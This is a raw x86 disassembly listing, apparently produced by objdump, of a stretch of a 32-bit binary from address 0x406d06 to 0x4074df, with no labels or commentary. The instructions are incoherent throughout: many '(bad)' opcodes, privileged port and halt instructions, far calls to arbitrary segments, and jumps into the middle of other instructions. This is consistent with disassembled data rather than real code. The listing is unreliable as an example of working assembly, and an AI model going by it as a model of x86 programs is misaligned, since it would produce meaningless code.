  406d06:	xchg   esp,eax
  406d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d08:	imul   BYTE PTR [ecx-0x248861a0]
  406d0e:	inc    ebp
  406d0f:	mov    DWORD PTR [eax],esi
  406d11:	sub    cl,BYTE PTR [edi-0x73]
  406d14:	pop    esi
  406d15:	sbb    ebx,0x96e849e5
  406d1b:	add    BYTE PTR [ecx+0x46],ah
  406d1e:	fcmove st,st(0)
  406d20:	sbb    al,0x86
  406d22:	push   ds
  406d23:	imul   ebx,DWORD PTR [ecx],0xffffffe5
  406d26:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  406d28:	fwait
  406d29:	adc    al,0x2b
  406d2b:	fmul   DWORD PTR [eax+0x79bb6ee7]
  406d31:	into   
  406d32:	stc    
  406d33:	ds (bad) 
  406d35:	fadd   DWORD PTR [eax+0x74]
  406d38:	fs cmp bl,dh
  406d3b:	lds    edx,FWORD PTR [ecx]
  406d3d:	fst    st(6)
  406d3f:	stos   BYTE PTR es:[edi],al
  406d40:	call   0xdeff9480
  406d45:	and    cl,dl
  406d47:	mov    ah,BYTE PTR [ebx]
  406d49:	ds and eax,0xb4295ec
  406d4f:	mov    edi,0x4830bfd2
  406d54:	mov    cl,dl
  406d56:	lahf   
  406d57:	jo     0x406d42
  406d59:	xchg   ebx,eax
  406d5a:	adc    DWORD PTR [edi-0x7763fbf9],edi
  406d60:	sbb    BYTE PTR [ecx+0x7e],ch
  406d63:	mov    al,ds:0x830247ac
  406d68:	ins    BYTE PTR es:[edi],dx
  406d69:	fistp  DWORD PTR [edi-0x51]
  406d6c:	int    0xae
  406d6e:	ror    DWORD PTR [ecx+0x718559a],1
  406d74:	cli    
  406d75:	push   esi
  406d76:	dec    edi
  406d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d78:	inc    ebp
  406d79:	jbe    0x406d7e
  406d7b:	jns    0x406db0
  406d7d:	xchg   esp,esi
  406d7f:	sahf   
  406d80:	sub    edi,DWORD PTR ds:0xf0f07acc
  406d86:	test   al,0x64
  406d88:	mov    al,0xd2
  406d8a:	push   ds
  406d8b:	shl    BYTE PTR [ebp+0x3],0xd4
  406d8f:	aam    0x84
  406d91:	fiadd  WORD PTR [edi+0x7ed22ca8]
  406d97:	imul   esi,DWORD PTR [eax-0x1c],0x2
  406d9b:	out    dx,al
  406d9c:	push   0x25
  406d9e:	pop    esi
  406d9f:	xor    eax,0xcbc3c6b2
  406da4:	fs popa 
  406da6:	ror    al,0x80
  406da9:	jno    0x406d58
  406dab:	mov    BYTE PTR ds:0xfe062ccb,0x37
  406db2:	push   esp
  406db3:	inc    edx
  406db4:	sbb    al,0x2
  406db6:	stos   BYTE PTR es:[edi],al
  406db7:	adc    eax,DWORD PTR [esi+ebx*1]
  406dba:	sub    bl,BYTE PTR [edi-0x5cd4bca6]
  406dc0:	dec    esi
  406dc1:	shld   DWORD PTR [esi-0xe36b3b5],esp,cl
  406dc8:	int    0x7e
  406dca:	dec    esp
  406dcb:	outs   dx,BYTE PTR ds:[esi]
  406dcc:	scas   al,BYTE PTR es:[edi]
  406dcd:	(bad)  
  406dce:	jb     0x406e01
  406dd0:	ror    BYTE PTR [ecx+0x27],1
  406dd3:	loopne 0x406e01
  406dd5:	bound  ecx,QWORD PTR [ebx-0x70]
  406dd8:	shl    BYTE PTR [ecx+0x60],1
  406ddb:	mov    ds:0x172c44df,eax
  406de0:	std    
  406de1:	retf   
  406de2:	scas   eax,DWORD PTR es:[edi]
  406de3:	or     esi,DWORD PTR [esi]
  406de5:	imul   eax,DWORD PTR [esi],0xffffffb2
  406de8:	je     0x406e50
  406dea:	cli    
  406deb:	outs   dx,BYTE PTR ds:[esi]
  406dec:	mov    ecx,0xe4590496
  406df1:	sahf   
  406df2:	(bad)  
  406df3:	sbb    al,0xa
  406df5:	lea    ebp,[edx]
  406df7:	(bad)  
  406df8:	addr16 mov cl,0x32
  406dfb:	addr16 xor edi,ebx
  406dfe:	mov    ebx,0xd5cc4790
  406e03:	fst    QWORD PTR [ecx+eax*1]
  406e06:	cmc    
  406e07:	adc    eax,0x2303ed30
  406e0c:	das    
  406e0d:	sti    
  406e0e:	jbe    0x406d97
  406e10:	sti    
  406e11:	hlt    
  406e12:	jmp    0xce168f68
  406e17:	outs   dx,DWORD PTR ds:[esi]
  406e18:	mov    ch,0xc3
  406e1a:	xor    eax,DWORD PTR [ecx]
  406e1c:	mov    esi,0xa602bda1
  406e21:	push   ss
  406e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e23:	mov    cl,0x86
  406e25:	cmp    ebx,DWORD PTR [ebp+eax*8-0x14d8899]
  406e2c:	es nop
  406e2e:	inc    ecx
  406e2f:	and    bh,bh
  406e31:	ja     0x406dd2
  406e33:	imul   ecx,ebx,0xffffffc6
  406e36:	xchg   esi,eax
  406e37:	mov    ch,0x57
  406e39:	aaa    
  406e3a:	sti    
  406e3b:	gs push edx
  406e3d:	cli    
  406e3e:	mov    edi,0x164781ac
  406e43:	fcom   QWORD PTR [edx+0x74babb11]
  406e49:	sbb    DWORD PTR [eax-0xbd03537],eax
  406e4f:	in     al,0x27
  406e51:	adc    DWORD PTR [ebp+0x75781940],ebp
  406e57:	dec    edx
  406e58:	push   ds
  406e59:	xchg   edx,eax
  406e5a:	and    al,0xe3
  406e5c:	jne    0x406dee
  406e5e:	test   eax,0xc84738c9
  406e63:	push   edx
  406e64:	xchg   ecx,eax
  406e65:	pop    ebp
  406e66:	cld    
  406e67:	setle  BYTE PTR [esi-0x1475648a]
  406e6e:	sti    
  406e6f:	inc    eax
  406e70:	jo     0x406e0a
  406e72:	(bad)  
  406e73:	rsm    
  406e75:	test   BYTE PTR [edx+0x9b6a85f],bl
  406e7b:	into   
  406e7c:	push   0xffffffa9
  406e7e:	call   0x9425:0x359480b8
  406e85:	xchg   esp,eax
  406e86:	mov    ah,0x5
  406e88:	(bad)  
  406e89:	mov    BYTE PTR [ecx-0x746d29fc],dh
  406e8f:	pop    esp
  406e90:	push   0xffffff9d
  406e92:	dec    ebp
  406e93:	xor    al,0xab
  406e95:	mov    bl,0x1b
  406e97:	mov    bl,0x26
  406e99:	jge    0x406e9a
  406e9b:	mov    BYTE PTR es:[eax-0x7e49c8fd],dl
  406ea2:	adc    ebp,eax
  406ea4:	dec    edx
  406ea5:	push   0x19
  406ea7:	mov    edx,0x2521f0cd
  406eac:	xor    eax,0x478ea716
  406eb1:	leave  
  406eb2:	fwait
  406eb3:	sub    eax,0x62f76939
  406eb8:	dec    ebx
  406eb9:	test   eax,0xe8d1b4f9
  406ebe:	mov    ah,0x36
  406ec0:	mov    ds:0xf8fa3ef3,eax
  406ec5:	in     eax,dx
  406ec6:	in     al,dx
  406ec7:	jno    0x406ebf
  406ec9:	mov    ebx,0xf78b339e
  406ece:	outs   dx,BYTE PTR ds:[esi]
  406ecf:	aad    0x81
  406ed1:	and    eax,0xbfaf0721
  406ed6:	sbb    BYTE PTR [edx-0x67d0976],dh
  406edc:	fistp  QWORD PTR [ecx+0x2e]
  406edf:	inc    edx
  406ee0:	shl    DWORD PTR [ebp-0x39],1
  406ee3:	and    eax,0xc081d044
  406ee8:	test   BYTE PTR [eax],bh
  406eea:	in     eax,0x74
  406eec:	loope  0x406e7a
  406eee:	mov    eax,ds:0x365ff200
  406ef3:	lock add eax,0x2b4b5031
  406ef9:	lahf   
  406efa:	xchg   DWORD PTR [edx-0x69],ebp
  406efd:	sbb    al,BYTE PTR ds:[eax-0x9]
  406f01:	mov    esp,0x1ce504a3
  406f06:	repnz add dh,BYTE PTR [eax+0x4e]
  406f0a:	sahf   
  406f0b:	adc    edx,edi
  406f0d:	pushf  
  406f0e:	ret    0xa339
  406f11:	ret    
  406f12:	out    0x26,al
  406f14:	sub    BYTE PTR [eax],ah
  406f16:	xor    eax,0x7fa78c1c
  406f1b:	std    
  406f1c:	mov    cl,BYTE PTR [esi+0xa]
  406f1f:	xor    cl,BYTE PTR [ecx]
  406f21:	sbb    ebp,DWORD PTR [esi+0x1c361e5a]
  406f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f28:	push   esp
  406f29:	retf   0xb1d1
  406f2c:	adc    bh,BYTE PTR [ecx+0x41]
  406f2f:	(bad)  
  406f30:	dec    eax
  406f31:	mov    ds:0x683f6725,eax
  406f36:	xchg   ebx,eax
  406f37:	jae    0x406ee1
  406f39:	and    al,0x78
  406f3b:	addr16 xchg esp,eax
  406f3d:	rcl    esi,0x23
  406f40:	cdq    
  406f41:	sbb    al,0xc6
  406f43:	arpl   WORD PTR [edx+0x32],dx
  406f46:	fisubr DWORD PTR [ecx+0x1f]
  406f49:	fwait
  406f4a:	int3   
  406f4b:	mov    BYTE PTR [esi+0xb69ed47],ch
  406f51:	sbb    DWORD PTR [edi],ebx
  406f53:	jmp    0xdeca:0xd73e7306
  406f5a:	push   ds
  406f5b:	xlat   BYTE PTR ds:[ebx]
  406f5c:	add    BYTE PTR [eax+ebp*4],dh
  406f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f60:	cmp    eax,0x87951c94
  406f65:	cs jg  0x406f74
  406f68:	in     al,dx
  406f69:	into   
  406f6a:	dec    ecx
  406f6b:	shr    DWORD PTR [eax-0x7c],0xcf
  406f6f:	cmp    al,0x28
  406f71:	sub    bh,BYTE PTR [esi]
  406f73:	xchg   edx,eax
  406f74:	retf   
  406f75:	mov    BYTE PTR ds:0x55f42aae,cl
  406f7b:	push   esp
  406f7c:	jl     0x406fcb
  406f7e:	pop    esp
  406f7f:	(bad)  
  406f80:	mov    dh,0xd
  406f82:	mov    al,0x6
  406f84:	inc    esi
  406f85:	ja     0x406f4c
  406f87:	fs leave 
  406f89:	ja     0x406fc9
  406f8b:	and    dl,BYTE PTR [esi+eax*8-0x37]
  406f8f:	cmp    ebp,DWORD PTR [esi+0xa]
  406f92:	pop    ecx
  406f93:	push   esp
  406f94:	mov    WORD PTR [ebp+0x34],cs
  406f97:	add    edx,DWORD PTR [ebx+0x29]
  406f9a:	xchg   ebp,eax
  406f9b:	ins    DWORD PTR es:[edi],dx
  406f9c:	adc    eax,0x2162c795
  406fa1:	mov    edi,0x6e9a99ae
  406fa6:	mov    ah,BYTE PTR [ebx-0x15]
  406fa9:	sbb    ebp,edx
  406fab:	rol    BYTE PTR [ebp-0x3c909c5b],1
  406fb1:	jne    0x406ff5
  406fb3:	cli    
  406fb4:	cmp    bl,BYTE PTR [edi+esi*8-0x2bdac84f]
  406fbb:	pop    edx
  406fbc:	mov    al,ds:0xf0351e73
  406fc1:	aas    
  406fc2:	or     eax,0x3b725013
  406fc7:	mov    al,0xc6
  406fc9:	dec    ebx
  406fca:	popf   
  406fcb:	mov    edx,0x39451239
  406fd0:	aaa    
  406fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fd2:	jb     0x406fa9
  406fd4:	push   esp
  406fd5:	push   0x9aa4cd29
  406fda:	hlt    
  406fdb:	xor    ah,BYTE PTR ds:0xc36052e7
  406fe1:	add    edi,eax
  406fe3:	out    dx,eax
  406fe4:	xchg   BYTE PTR [edx],bl
  406fe6:	add    BYTE PTR [esi-0x70],dl
  406fe9:	outs   dx,DWORD PTR ds:[esi]
  406fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406feb:	std    
  406fec:	clc    
  406fed:	lods   eax,DWORD PTR ds:[esi]
  406fee:	stos   BYTE PTR es:[edi],al
  406fef:	pushf  
  406ff0:	test   DWORD PTR [edi],ecx
  406ff2:	ficom  WORD PTR [edx+ebp*1]
  406ff5:	sahf   
  406ff6:	and    esi,DWORD PTR [ebx]
  406ff8:	jmp    0x406f83
  406ffa:	pop    es
  406ffb:	cmp    DWORD PTR [edx],0x2b
  406ffe:	addr16 ffreep st(7)
  407001:	test   al,0xd
  407003:	push   0x44
  407005:	push   edx
  407006:	adc    edx,ebp
  407008:	xor    ch,ch
  40700a:	lods   eax,DWORD PTR ds:[esi]
  40700b:	dec    eax
  40700c:	mov    ebp,0x961c9996
  407011:	add    cl,BYTE PTR [ecx-0x24c49d88]
  407017:	leave  
  407018:	add    BYTE PTR [edx-0x67b9de8a],al
  40701e:	xlat   BYTE PTR ds:[ebx]
  40701f:	mov    bl,0x15
  407021:	sahf   
  407022:	mov    ebp,0xfa6f791f
  407027:	data16 add ah,BYTE PTR [ebp-0x75]
  40702b:	call   0xc6b3:0xba14580a
  407032:	pop    edi
  407033:	add    dh,BYTE PTR [ebx-0x4e]
  407036:	fcom   DWORD PTR [esi+0x5b4e7387]
  40703c:	popa   
  40703d:	rcl    DWORD PTR [eax],1
  40703f:	fiadd  DWORD PTR [edi+0x70fd7c54]
  407045:	cmp    eax,0x317f60d6
  40704a:	push   eax
  40704b:	int    0x9c
  40704d:	clc    
  40704e:	aas    
  40704f:	mov    al,0xc3
  407051:	in     eax,0x9f
  407053:	sub    al,0xf7
  407055:	xor    edx,ecx
  407057:	lods   al,BYTE PTR ds:[esi]
  407058:	jl     0x407095
  40705a:	pushf  
  40705b:	call   0x4678e59e
  407060:	ficomp DWORD PTR [eax]
  407062:	and    ebx,DWORD PTR ds:0xc76f60ba
  407068:	pop    edx
  407069:	nop
  40706a:	sub    al,0xf1
  40706c:	push   ds
  40706d:	mov    ah,0xf9
  40706f:	ret    
  407070:	gs mov edx,0xb6d2d822
  407076:	mov    eax,0xa2a316f8
  40707b:	adc    ch,dh
  40707d:	push   cs
  40707e:	mov    eax,ds:0x8f8a72f0
  407083:	int3   
  407084:	ins    DWORD PTR es:[edi],dx
  407085:	dec    esp
  407086:	in     eax,0x19
  407088:	pop    ss
  407089:	sti    
  40708a:	mov    ch,0xd0
  40708c:	lahf   
  40708d:	in     al,dx
  40708e:	cld    
  40708f:	or     edx,esi
  407091:	inc    edi
  407092:	mov    ah,0xf9
  407094:	ins    BYTE PTR es:[edi],dx
  407095:	cld    
  407096:	sar    edx,0xef
  407099:	mov    ecx,0xcd865e3b
  40709e:	test   BYTE PTR [ebp-0x7c],0xef
  4070a2:	outs   dx,BYTE PTR ds:[esi]
  4070a3:	sub    al,0xa4
  4070a5:	sub    ecx,DWORD PTR [ecx]
  4070a7:	cmp    esi,eax
  4070a9:	mov    BYTE PTR [ecx-0x7e],al
  4070ac:	popa   
  4070ad:	hlt    
  4070ae:	mov    BYTE PTR [ebp*8+0x5a8c44df],ah
  4070b5:	imul   esi,edi,0x32cd085c
  4070bb:	mov    edi,0x55539aa7
  4070c0:	fsubr  DWORD PTR [esp+ebx*1+0x55ff82da]
  4070c7:	fcmovb st,st(4)
  4070c9:	into   
  4070ca:	in     eax,0x8b
  4070cc:	sahf   
  4070cd:	test   DWORD PTR [ecx+0x7e3745e0],0x9f2d45f0
  4070d7:	inc    esp
  4070d8:	into   
  4070d9:	jns    0x407157
  4070db:	pop    esp
  4070dc:	push   ss
  4070dd:	sub    DWORD PTR [ebx+0x1b8179a9],0x9b7a7ab5
  4070e7:	call   DWORD PTR [esi]
  4070e9:	test   eax,0x8bd49a21
  4070ee:	sbb    eax,DWORD PTR [edx-0x48]
  4070f1:	fwait
  4070f2:	test   eax,0x56a3df55
  4070f7:	(bad)  
  4070f8:	mov    ds:0xb7166056,al
  4070fd:	cld    
  4070fe:	cwde   
  4070ff:	stc    
  407100:	and    eax,0xfd4e883b
  407105:	adc    esi,DWORD PTR [ecx+0x77]
  407108:	(bad)  
  40710a:	ret    
  40710b:	xchg   BYTE PTR [ecx+0x9ede35f],dl
  407111:	jp     0x407097
  407113:	cld    
  407114:	(bad)  
  407115:	and    ebp,DWORD PTR [ecx-0x6]
  407118:	imul   edx,DWORD PTR [ebp-0x2f736b9c],0xffffffc3
  40711f:	sub    al,ah
  407121:	xor    eax,esi
  407123:	dec    esi
  407124:	aad    0x9c
  407126:	mov    ds:0xba56a0b2,eax
  40712b:	rcl    DWORD PTR ds:0xc1503066,0x48
  407132:	and    BYTE PTR [ecx+0x19],al
  407135:	call   ebp
  407137:	sub    eax,0xacad1966
  40713c:	mov    edx,0x8a1e89f4
  407141:	inc    ecx
  407142:	push   DWORD PTR [edi*4+0x2482d3d3]
  407149:	mov    ebx,0xf976c769
  40714e:	inc    esp
  40714f:	retf   
  407150:	(bad)  
  407151:	dec    esp
  407152:	jge    0x40712b
  407154:	stos   DWORD PTR es:[edi],eax
  407155:	mov    al,ds:0x7e9d27ff
  40715a:	pop    ss
  40715b:	repnz lods al,BYTE PTR ds:[esi]
  40715d:	ret    0xac6b
  407160:	adc    esp,DWORD PTR [edi]
  407162:	das    
  407163:	dec    ecx
  407164:	fld    TBYTE PTR [edi]
  407167:	mov    esp,0x38cfeb16
  40716c:	arpl   WORD PTR [eax],bp
  40716e:	rcr    ecx,cl
  407170:	mov    cl,0x54
  407172:	xchg   ebx,eax
  407173:	int3   
  407174:	sub    al,0x60
  407176:	dec    edx
  407177:	adc    DWORD PTR [eax-0x49be92c1],esp
  40717d:	sub    eax,0xd9d929bb
  407182:	shl    ah,cl
  407184:	or     al,0x5a
  407186:	int3   
  407187:	mov    edx,0x8352b64
  40718c:	fsubr  QWORD PTR [eax+0x6]
  40718f:	call   0x2ab3:0xf55b3ce6
  407196:	stos   BYTE PTR es:[edi],al
  407197:	mov    eax,ds:0xd10c77e4
  40719c:	cmp    eax,0xcce200eb
  4071a1:	addr16 xchg edi,eax
  4071a3:	pop    ds
  4071a4:	xor    ch,BYTE PTR [ebx]
  4071a6:	stos   DWORD PTR es:[edi],eax
  4071a7:	push   esp
  4071a8:	pop    edx
  4071a9:	sar    DWORD PTR [esi-0x6aac4ada],cl
  4071af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071b0:	jns    0x40720c
  4071b2:	adc    BYTE PTR [edx+esi*4+0x2e],cl
  4071b6:	fisub  DWORD PTR [ecx+0x616ec02d]
  4071bc:	xchg   BYTE PTR [edx-0x72],ah
  4071bf:	xchg   ecx,eax
  4071c0:	pop    esi
  4071c1:	sbb    edx,0xd05b7e68
  4071c7:	cmp    DWORD PTR [esi+edx*2+0x14],eax
  4071cb:	cmp    esp,DWORD PTR [ebp+0x6177d138]
  4071d1:	cdq    
  4071d2:	enter  0x573f,0x1
  4071d6:	cmp    BYTE PTR cs:[ebx+0x6fac3f26],ah
  4071dd:	mov    cl,0xfc
  4071df:	out    dx,eax
  4071e0:	xchg   ebp,eax
  4071e1:	dec    ebp
  4071e2:	adc    eax,0xcb2e7311
  4071e7:	ins    DWORD PTR es:[edi],dx
  4071e8:	mov    eax,ds:0xd9c5f507
  4071ed:	or     eax,0x94dd2707
  4071f2:	inc    ebp
  4071f3:	inc    edx
  4071f4:	leave  
  4071f5:	mov    dh,0x54
  4071f7:	and    cl,ah
  4071f9:	stc    
  4071fa:	pop    ds
  4071fb:	jp     0x4071e6
  4071fd:	pop    ebx
  4071fe:	(bad)  
  4071ff:	pop    ecx
  407200:	jns    0x407229
  407202:	add    al,0x27
  407204:	std    
  407205:	loope  0x407205
  407207:	xor    al,0xb3
  407209:	pop    edx
  40720a:	inc    ebx
  40720b:	pop    esp
  40720c:	cmp    al,0x21
  40720e:	pop    ecx
  40720f:	ins    DWORD PTR es:[edi],dx
  407210:	jae    0x40727a
  407212:	psubw  mm3,QWORD PTR [eax+0x6cc5d26]
  407219:	sub    eax,0x3f7600ab
  40721e:	push   esi
  40721f:	mov    eax,ds:0x640f92de
  407224:	pop    ds
  407225:	dec    eax
  407226:	xlat   BYTE PTR ds:[ebx]
  407227:	dec    ebp
  407228:	jne    0x4071eb
  40722a:	pop    ds
  40722b:	inc    ecx
  40722c:	cdq    
  40722d:	xchg   esp,eax
  40722e:	dec    esp
  40722f:	xchg   DWORD PTR [eax],eax
  407231:	ret    0x3d62
  407234:	into   
  407235:	mov    esi,0x23ebfdbd
  40723a:	mov    bl,0xa9
  40723c:	mov    BYTE PTR [ebx-0x17b621a2],0x61
  407243:	test   BYTE PTR [edi+0x49cbe9ea],dh
  407249:	(bad)  
  40724a:	xor    bl,ah
  40724c:	xor    eax,0xd00cab6d
  407251:	ins    DWORD PTR es:[edi],dx
  407252:	ja     0x4072a6
  407254:	sahf   
  407255:	cmp    DWORD PTR ds:0x6f1fa9f3,edi
  40725b:	push   ebx
  40725c:	call   0x5a83f62e
  407261:	rol    BYTE PTR [esi-0x6e],1
  407264:	xchg   BYTE PTR [ebx+0x2fd1e6fe],dh
  40726a:	mov    ch,0x86
  40726c:	dec    ebx
  40726d:	call   0xc427810b
  407272:	ja     0x40720a
  407274:	jae    0x4072b7
  407276:	pop    ss
  407277:	fimul  WORD PTR [edx]
  407279:	lods   al,BYTE PTR ds:[esi]
  40727a:	inc    edx
  40727b:	cmc    
  40727c:	mov    dh,0xed
  40727e:	daa    
  40727f:	jo     0x407300
  407281:	adc    ebp,0xa63718db
  407287:	cmp    al,0xaf
  407289:	xor    ebx,ebp
  40728b:	ror    bh,cl
  40728d:	xchg   ecx,eax
  40728e:	inc    esi
  40728f:	or     al,0x12
  407291:	scas   eax,DWORD PTR es:[edi]
  407292:	shl    eax,0x2e
  407295:	inc    ebx
  407296:	dec    esp
  407297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407298:	jp     0x40729f
  40729a:	or     BYTE PTR ds:[edi+0x75],al
  40729e:	mov    esi,0x70356848
  4072a3:	push   0xe8e0f221
  4072a8:	mov    eax,ds:0xfc2bf29d
  4072ad:	mov    DWORD PTR [edx-0x64],ebp
  4072b0:	push   cs
  4072b1:	add    edi,DWORD PTR [edx-0x4ab3236d]
  4072b7:	or     eax,0xab02c295
  4072bc:	pop    esi
  4072bd:	shl    DWORD PTR [eax-0x3a],cl
  4072c0:	jbe    0x40724c
  4072c2:	xchg   esi,eax
  4072c3:	(bad)  
  4072c4:	fld    TBYTE PTR [ebx]
  4072c6:	sub    esp,ebp
  4072c8:	push   eax
  4072c9:	outs   dx,BYTE PTR ds:[esi]
  4072ca:	iret   
  4072cb:	xlat   BYTE PTR ds:[ebx]
  4072cc:	daa    
  4072cd:	jecxz  0x4072d5
  4072cf:	add    eax,0x35aa18e8
  4072d4:	loop   0x4072ba
  4072d6:	inc    edi
  4072d7:	fild   WORD PTR [edx]
  4072d9:	aas    
  4072da:	repz repnz pop es
  4072dd:	mov    ebp,ss
  4072df:	int    0x3a
  4072e1:	es mov bl,0x30
  4072e4:	adc    ebp,edi
  4072e6:	mov    dh,0xb4
  4072e8:	data16 gs fcom QWORD PTR es:[edi+0x7f]
  4072ee:	das    
  4072ef:	xor    ecx,edi
  4072f1:	jmp    0x4072a1
  4072f3:	push   0x1281db1c
  4072f8:	in     al,0x57
  4072fa:	ja     0x407355
  4072fc:	fdiv   QWORD PTR [esi-0x11]
  4072ff:	and    eax,0xe6e99e55
  407304:	push   cs
  407305:	sbb    al,0xc2
  407307:	and    bl,BYTE PTR [ebx+0x14]
  40730a:	mov    esi,0xe7abadf0
  40730f:	imul   eax,ebx,0xfb4d79ab
  407315:	or     BYTE PTR [edx+eiz*4-0x53391686],al
  40731c:	and    DWORD PTR [esi+0x43cd277c],esi
  407322:	icebp  
  407323:	and    dh,BYTE PTR ds:0xf75afcbf
  407329:	cs test al,cl
  40732c:	cld    
  40732d:	mov    BYTE PTR [edi],bh
  40732f:	pop    es
  407330:	add    al,0x31
  407332:	repz jbe 0x4072eb
  407335:	lods   eax,DWORD PTR ds:[esi]
  407336:	cmp    DWORD PTR ds:0x6f6dca03,ebx
  40733c:	ret    
  40733d:	sbb    dh,ah
  40733f:	add    ecx,esp
  407341:	call   0xe4747993
  407346:	dec    esi
  407347:	inc    edx
  407348:	js     0x407335
  40734a:	out    dx,eax
  40734b:	test   al,0xdd
  40734d:	sub    eax,0x553633d1
  407352:	shr    BYTE PTR [edi],cl
  407354:	xchg   edx,eax
  407355:	push   ebp
  407356:	cdq    
  407357:	pop    ebp
  407358:	repz cmp al,0xf6
  40735b:	xor    cl,BYTE PTR [ebp-0x56809916]
  407361:	and    DWORD PTR [edi+ecx*8-0x10],eax
  407365:	push   es
  407366:	repnz imul ebx,DWORD PTR [eax-0x6ec11e81],0xb
  40736e:	sub    ch,al
  407370:	or     eax,0xe4e60ce
  407375:	push   esi
  407376:	cmc    
  407377:	pop    ebp
  407378:	es test eax,0x8c69d506
  40737e:	cmp    al,BYTE PTR [ecx+ebp*8-0x1e408531]
  407385:	(bad)  
  407386:	popf   
  407387:	outs   dx,DWORD PTR ds:[esi]
  407388:	push   esi
  407389:	jle    0x40735b
  40738b:	xchg   edx,eax
  40738c:	inc    esp
  40738d:	cwde   
  40738e:	adc    eax,0x3aad65e7
  407393:	into   
  407394:	or     DWORD PTR [esp+edx*1],0x75
  407398:	push   0xe9d226c2
  40739d:	mov    ebx,0xc86c1e15
  4073a2:	inc    edi
  4073a3:	hlt    
  4073a4:	shl    DWORD PTR [edx-0xd],cl
  4073a7:	push   ss
  4073a8:	or     DWORD PTR [edx],0xed35129
  4073ae:	(bad)  
  4073b0:	out    0x83,eax
  4073b2:	aas    
  4073b3:	inc    edx
  4073b4:	ins    DWORD PTR es:[edi],dx
  4073b5:	mov    esi,0xbd63f130
  4073ba:	jae    0x407402
  4073bc:	ja     0x407353
  4073be:	aad    0x76
  4073c0:	inc    edi
  4073c1:	dec    ecx
  4073c2:	dec    esi
  4073c3:	dec    esp
  4073c4:	jge    0x4073ea
  4073c6:	mov    ch,0x83
  4073c8:	retf   
  4073c9:	ds ret 0x5625
  4073cd:	rcl    BYTE PTR [ebx-0x64792f70],1
  4073d3:	xor    bl,al
  4073d5:	sahf   
  4073d6:	jo     0x40744c
  4073d8:	add    al,0xdc
  4073da:	jmp    0x4bc07435
  4073df:	sbb    eax,0x5e8acfeb
  4073e4:	sbb    eax,0xc36649f2
  4073e9:	shr    DWORD PTR [ecx+0x2deae63b],0x36
  4073f0:	test   eax,0x20f80836
  4073f6:	adc    ch,BYTE PTR [esp+edi*8-0x3c179b47]
  4073fd:	sti    
  4073fe:	daa    
  4073ff:	mov    bh,0x20
  407401:	mov    dl,0xe3
  407403:	xchg   edx,eax
  407404:	pusha  
  407405:	iret   
  407406:	jp     0x40746a
  407408:	(bad)  
  407409:	mov    ds:0xd0827a8d,eax
  40740e:	xchg   esp,eax
  40740f:	or     ebx,DWORD PTR [ecx]
  407411:	xchg   ebx,eax
  407412:	in     eax,dx
  407413:	xlat   BYTE PTR ds:[ebx]
  407414:	xchg   ecx,eax
  407415:	fistp  QWORD PTR [esi+0x15]
  407418:	mov    esp,0xa378e083
  40741d:	and    ebx,DWORD PTR [edx+0x5e]
  407420:	mov    DWORD PTR [esi+edx*1+0x5],ebp
  407424:	shl    bl,1
  407426:	mov    bl,0x2
  407428:	or     DWORD PTR [ebx-0x53],edx
  40742b:	ins    BYTE PTR es:[edi],dx
  40742c:	div    cl
  40742e:	mov    ch,0x86
  407430:	mov    ch,0xab
  407432:	test   BYTE PTR [edx+0x7b],0x54
  407436:	ins    BYTE PTR es:[edi],dx
  407437:	push   ds
  407438:	mov    DWORD PTR [edx],ecx
  40743a:	pushf  
  40743b:	mov    eax,ds:0xd3a4ea86
  407440:	or     BYTE PTR [ebx],ah
  407442:	clc    
  407443:	push   esi
  407444:	rcr    ch,1
  407446:	inc    ebx
  407447:	sub    al,0x73
  407449:	in     al,0xc9
  40744b:	mov    dh,0xc4
  40744d:	cs inc ebp
  40744f:	mov    WORD PTR [eax-0x2249dfb3],ds
  407455:	out    dx,al
  407456:	or     BYTE PTR [edi-0x1f861dc],al
  40745c:	ret    0x736d
  40745f:	in     eax,0x67
  407461:	aad    0xb
  407463:	and    al,0xa2
  407465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407466:	push   ds
  407467:	fimul  DWORD PTR [edx+0x30307d4d]
  40746d:	sbb    DWORD PTR [ecx+0x2a],ebx
  407470:	test   BYTE PTR [ecx-0x47],bl
  407473:	sub    eax,0x3d5aa9b1
  407478:	clc    
  407479:	adc    ch,ch
  40747b:	xor    BYTE PTR [ecx],bl
  40747d:	ret    
  40747e:	ja     0x40746c
  407480:	xchg   ecx,eax
  407481:	sbb    ebp,0xef672e1b
  407487:	pop    ss
  407488:	push   esp
  407489:	mov    eax,ecx
  40748b:	fwait
  40748c:	xor    al,0x31
  40748e:	retf   
  40748f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407490:	popa   
  407491:	imul   ebx,DWORD PTR [ecx+ebx*2+0x1e],0xffffffab
  407496:	loop   0x40749a
  407498:	xor    al,0xd4
  40749a:	test   BYTE PTR [ebx],bl
  40749c:	sub    DWORD PTR [ecx+0x75],ecx
  40749f:	mov    esp,0xf907ce81
  4074a4:	adc    eax,0xf062016a
  4074a9:	pop    esi
  4074aa:	add    al,0x38
  4074ac:	int    0x40
  4074ae:	fadd   DWORD PTR [esi+0x1]
  4074b1:	or     al,0x68
  4074b3:	dec    ecx
  4074b4:	loopne 0x4074ba
  4074b6:	mul    bh
  4074b8:	pop    ebx
  4074b9:	pop    ebx
  4074ba:	test   ebx,0x628e9afd
  4074c0:	or     dh,BYTE PTR [edx-0x62]
  4074c3:	out    0x65,eax
  4074c5:	outs   dx,DWORD PTR ds:[esi]
  4074c6:	hlt    
  4074c7:	xchg   ebp,eax
  4074c8:	rcl    BYTE PTR [esi-0x37],0x45
  4074cc:	xchg   esp,eax
  4074cd:	repnz xchg edi,edi
  4074d0:	mov    esp,0x2b9f800e
  4074d5:	cmc    
  4074d6:	add    DWORD PTR [ecx+ebx*1],ebp
  4074d9:	sbb    al,0xe6
  4074db:	pop    ebp
  4074dc:	fnstcw WORD PTR [edi-0x45]
  4074df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
